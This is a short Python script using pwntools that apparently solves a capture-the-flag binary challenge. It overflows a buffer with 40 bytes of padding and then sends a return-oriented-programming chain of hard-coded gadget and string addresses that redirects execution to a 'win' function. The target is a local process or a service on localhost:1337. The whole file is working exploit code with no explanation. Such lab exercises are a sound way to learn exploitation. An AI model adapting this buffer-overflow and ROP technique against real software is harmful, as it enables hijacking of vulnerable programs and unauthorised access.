from pwn import *

binary = args.BIN

e = context.binary = ELF(binary)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("localhost", 1337)
    else:
        return process(e.path)


p = start()

mov_rdi_rax = 0x00000000004011aa
rdx_rdi_rsi = 0x00000000004011b5
ret = 0x000000000040101a

piece1 = 0x402008
piece2 = 0x40200e
piece3 = 0x402014

code = 0x4011bc
win = 0x401263

print(p.recvuntil(b'awesome!').decode())
payload = b'a'*40 + p64(rdx_rdi_rsi) + p64(piece3) + p64(piece1) + p64(piece2) + p64(code) + p64(mov_rdi_rax) + p64(win)
p.sendline(payload)
print(p.recvall())
# p.interactive()